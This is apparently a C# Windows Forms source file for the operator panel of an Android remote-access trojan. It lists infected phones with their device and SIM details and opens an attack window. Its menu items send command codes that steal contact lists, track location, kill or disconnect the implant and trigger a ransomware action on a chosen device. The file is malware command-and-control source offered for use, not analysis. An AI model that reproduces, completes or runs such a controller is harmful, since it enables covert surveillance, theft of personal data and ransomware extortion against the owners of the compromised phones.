using SpellboundControl.Forms;
using System;
using System.Drawing;
using System.Collections.Generic;
using System.Linq;
using System.Windows.Forms;

namespace SpellboundControl
{
    public partial class Main : Form
    {
        private NetworkManager _networkManager;
        private DateTime _currentDateTime;
        private string _formattedTime;
        private ContactForm _contactForm;

        public Main()
        {
            InitializeComponent();
            _networkManager = new NetworkManager("127.0.0.1", 8083);
            _networkManager.DebugMessageReceived += UpdateDebugBox;
            _networkManager.DeviceInfoReceived += AddOrUpdateDevice;
            _networkManager.ClientDisconnected += RemoveDevice;
            _networkManager.ContactsDataReceived += OnContactsDataReceived;

            Server_Stuts_Led.Text = "Running";
            Server_Stuts_Led.ForeColor = Color.Green;
            Load += Main_Load;
        }

        private async void Main_Load(object sender, EventArgs e)
        {
            await _networkManager.Start();
        }

        private void UpdateCurrentTime()
        {
            _currentDateTime = DateTime.Now;
            _formattedTime = _currentDateTime.ToString("HH:mm:ss");
        }

        private void UpdateDebugBox(string message)
        {
            UpdateCurrentTime();
            DebugBox.AppendText($"{_formattedTime} {message}\n");
        }

        private void button2_Click(object sender, EventArgs e)
        {
            UpdateCurrentTime();
            DebugBox.AppendText($"{_formattedTime} [Attack] - Attack Window\n");
            Attack win2 = new Attack();
            win2.Show();
        }

        private void Sever_setting_Click_1(object sender, EventArgs e)
        {
            UpdateCurrentTime();
            DebugBox.AppendText($"{_formattedTime} [Server_Setting] - Setting Window\n");
            Seveur_Setting win2 = new Seveur_Setting();
            win2.Show();
        }

        private void Devices_Click_1(object sender, EventArgs e)
        {
            UpdateCurrentTime();
            DebugBox.AppendText($"{_formattedTime} [Devices] - List\n");
        }

        private void AddOrUpdateDevice(string id, string androidVersion, string language, string operatorSim, string country, string phoneName)
        {
            this.Invoke((Action)(() =>
            {
                int existingRowIndex = FindRowIndexBySystemId(id);
                if (existingRowIndex >= 0)
                {
                    var row = Devices_Grid.Rows[existingRowIndex];
                    row.Cells["Device_ID"].Value = id;
                    row.Cells["Android_Version"].Value = androidVersion;
                    row.Cells["Language"].Value = language;
                    row.Cells["SIM_Operator"].Value = operatorSim;
                    row.Cells["Country"].Value = country;
                    row.Cells["Phone_Name"].Value = phoneName;
                }
                else
                {
                    Devices_Grid.Rows.Add(id, androidVersion, language, operatorSim, country, phoneName);
                }
            }));
        }

        private void RemoveDevice(string id)
        {
            this.Invoke((Action)(() =>
            {
                int rowIndex = FindRowIndexBySystemId(id);
                if (rowIndex >= 0 && rowIndex < Devices_Grid.Rows.Count)
                {
                    Devices_Grid.Rows.RemoveAt(rowIndex);
                }
            }));
        }

        private int FindRowIndexBySystemId(string systemId)
        {
            foreach (DataGridViewRow row in Devices_Grid.Rows)
            {
                if (row.Cells["Device_ID"].Value != null) // Check for null if new row is exposed
                {
                    if (row.Cells["Device_ID"].Value.ToString().Equals(systemId))
                    {
                        return row.Index;
                    }
                }
            }
            return -1;
        }

        private void sendMSGToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            if (Devices_Grid.SelectedRows.Count > 0)
            {
                var selectedRow = Devices_Grid.SelectedRows[0];
                var deviceId = selectedRow.Cells["Device_ID"].Value.ToString();
                _networkManager.SendCommandToDevice(deviceId, "MSG");
            }
        }

        private void contactListToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            if (Devices_Grid.SelectedRows.Count > 0)
            {
                var selectedRow = Devices_Grid.SelectedRows[0];
                var deviceId = selectedRow.Cells["Device_ID"].Value.ToString();
                _networkManager.SendCommandToDevice(deviceId, "45666");
            }
        }

        private void OnContactsDataReceived(List<Contact> contacts)
        {
            // Ensure ContactForm is initialized and visible
            if (_contactForm == null || _contactForm.IsDisposed)
            {
                _contactForm = new ContactForm();
                _contactForm.Show();
            }

            _contactForm.SetContacts(contacts);
        }

        private void killToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (Devices_Grid.SelectedRows.Count > 0)
            {
                var selectedRow = Devices_Grid.SelectedRows[0];
                var deviceId = selectedRow.Cells["Device_ID"].Value.ToString();
                _networkManager.SendCommandToDevice(deviceId, "00001");

                DebugBox.AppendText($"{_formattedTime} [Devices] - {deviceId} - Kill Command Send\n");
            }
        }

        private void ransomwareToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (Devices_Grid.SelectedRows.Count > 0)
            {
                var selectedRow = Devices_Grid.SelectedRows[0];
                var deviceId = selectedRow.Cells["Device_ID"].Value.ToString();
                _networkManager.SendCommandToDevice(deviceId, "6666");

                DebugBox.AppendText($"{_formattedTime} [Devices] - {deviceId} - Ransomware Command Send\n");
            }
        }

        private void disconnectToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (Devices_Grid.SelectedRows.Count > 0)
            {
                var selectedRow = Devices_Grid.SelectedRows[0];
                var deviceId = selectedRow.Cells["Device_ID"].Value.ToString();
                _networkManager.SendCommandToDevice(deviceId, "00200");

                DebugBox.AppendText($"{_formattedTime} [Devices] - {deviceId} - Disconnect Command Send\n");
            }
        }

        private void locationToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (Devices_Grid.SelectedRows.Count > 0)
            {
                var selectedRow = Devices_Grid.SelectedRows[0];
                var deviceId = selectedRow.Cells["Device_ID"].Value.ToString();
                _networkManager.SendCommandToDevice(deviceId, "55555");

                DebugBox.AppendText($"{_formattedTime} [Devices] - {deviceId} - Location Command Send\n");
            }
        }
    }
         
 }

